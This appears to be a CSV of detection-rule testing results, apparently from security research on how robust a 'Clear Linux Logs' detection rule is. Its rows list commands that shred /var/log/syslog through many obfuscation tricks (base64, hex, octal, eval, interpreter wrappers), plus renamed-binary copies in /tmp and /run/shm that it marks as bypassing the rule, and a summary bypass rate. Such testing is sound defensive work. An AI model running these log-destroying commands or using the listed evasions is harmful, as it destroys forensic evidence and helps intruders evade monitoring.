ID,Command,Log File,Result,All Detected Rules
214,shred --remove --force -u /var/log/syslog,Clear_Linux_Logs_attack214.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
218,shred -u --remove=unlink --verbose /var/log/syslog,Clear_Linux_Logs_attack218.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
221,shred --remove --verbose /var/log/syslog -u,Clear_Linux_Logs_attack221.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
225,shred --remove=wipe -u /var/log/syslog,Clear_Linux_Logs_attack225.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
227,shred /var/log/syslog --verbose --remove,Clear_Linux_Logs_attack227.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
229,shred /var/log/syslog --force -u,Clear_Linux_Logs_attack229.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
231,shred --remove /var/log/syslog -u,Clear_Linux_Logs_attack231.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
235,shred --remove=wipe --force /var/log/syslog -u,Clear_Linux_Logs_attack235.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
241,shred -u /var/log/017163,Clear_Linux_Logs_attack241.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
242,shred -u /var/log/0x7f000001,Clear_Linux_Logs_attack242.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
243,shred -u /var/log/2130706433,Clear_Linux_Logs_attack243.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
244,shred -u /var/log/0x7F000001,Clear_Linux_Logs_attack244.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
245,shred -u /var/log/3232235521,Clear_Linux_Logs_attack245.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
246,shred -u /var/log/0xC0A80001,Clear_Linux_Logs_attack246.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
247,shred -u /var/log/030052000001,Clear_Linux_Logs_attack247.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
248,shred -u /var/log/0b01111111000000000000000000000001,Clear_Linux_Logs_attack248.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
249,shred -u /var/log/0x00007F000001,Clear_Linux_Logs_attack249.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
250,shred -u /var/log/\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x73\x79\x73\x6c\x6f\x67,Clear_Linux_Logs_attack250.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
251,shred -u /var/log/$((2130706433)),Clear_Linux_Logs_attack251.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
252,shred -u /var/log/$'\x2fvar\x2flog\x2fsyslog',Clear_Linux_Logs_attack252.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
254,shred -u /var/log/$(printf '%s' '/var/log/syslog'),Clear_Linux_Logs_attack254.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
255,shred -u $(echo '/var/log/syslog'),Clear_Linux_Logs_attack255.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
256,shred -u $(echo -n '/var/log/syslog'),Clear_Linux_Logs_attack256.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
258,shred -u $(echo '/var'/'log'/'syslog'),Clear_Linux_Logs_attack258.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
260,shred -u $(eval echo /var/log/syslog),Clear_Linux_Logs_attack260.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
261,"shred -u ""$(printf '/%s/%s/%s' var log syslog)""",Clear_Linux_Logs_attack261.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
262,shred -u $(echo /var/log/$(basename /var/log/syslog)),Clear_Linux_Logs_attack262.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
266,shred -u $(readlink -f /var/../var/log/syslog),Clear_Linux_Logs_attack266.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
267,"shred -u $(python3 -c ""print('/var/log/' + 'syslog')"")",Clear_Linux_Logs_attack267.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
268,"shred -u $(perl -e ""print '/var/log/syslog'"")",Clear_Linux_Logs_attack268.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
270,shred -u $(echo c3hyZWQgLXUgL3Zhci9sb2cvc3lzbG9n | base64 -d | cut -d ' ' -f3),Clear_Linux_Logs_attack270.log,Trigger: Clear Linux Logs,Decode Base64 Encoded Text | File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
273,shred -u $(echo -e '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_attack273.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
274,shred -u $(printf '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_attack274.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
275,shred -u $(echo $'\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_attack275.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
276,"shred -u $(awk 'BEGIN{printf ""/var/log/syslog""}')",Clear_Linux_Logs_attack276.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
277,"shred -u $(perl -e 'print ""/var/log/syslog""')",Clear_Linux_Logs_attack277.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
282,shred -u $(printf '/%s/%s/%s' var log syslog),Clear_Linux_Logs_attack282.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
283,shred -u $(echo /var/log/{syslog}),Clear_Linux_Logs_attack283.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
289,shred -u $(echo 2f7661722f6c6f672f7379736c6f67 | xxd -r -p),Clear_Linux_Logs_attack289.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
290,shred -u $(echo L3Zhci9sb2cvc3lzbG9n | base64 -d),Clear_Linux_Logs_attack290.log,Trigger: Clear Linux Logs,Decode Base64 Encoded Text | File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
292,shred -u $(echo $((0x2f766172)) | sed 's/.*/\/var\/log\/syslog/'),Clear_Linux_Logs_attack292.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
293,shred -u $(printf '/var/%s/%s' log syslog),Clear_Linux_Logs_attack293.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
294,shred -u $(echo /var/log/syslog | iconv -f utf-8 -t utf-8),Clear_Linux_Logs_attack294.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
295,"shred -u $(printf '%s' ""$(echo /var/log/syslog)"")",Clear_Linux_Logs_attack295.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
299,shred -u $(echo /var/log/syslog | awk '{print}'),Clear_Linux_Logs_attack299.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
318,cp /usr/bin/shred /run/shm/sh; /run/shm/sh -u /var/log/syslog,Clear_Linux_Logs_attack318.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
321,cp /usr/bin/shred /tmp/shred99; /tmp/shred99 -u /var/log/syslog,Clear_Linux_Logs_attack321.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
334,cp /usr/bin/shred /tmp/sh0; /tmp/sh0 -u /var/log/syslog,Clear_Linux_Logs_attack334.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
356,cp /usr/bin/shred /tmp/shr; /tmp/shr -u /var/log/syslog,Clear_Linux_Logs_attack356.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Calculation Base (Source: Detection Results),,,,
Total Meaningful Logs (Denominator),210,,,
Triggered Target (Detections),195,,,
Bypass Logs (Numerator),15,,,
BYPASS RATE (Bypass/Meaningful),15 / 210 (7.14%),,,
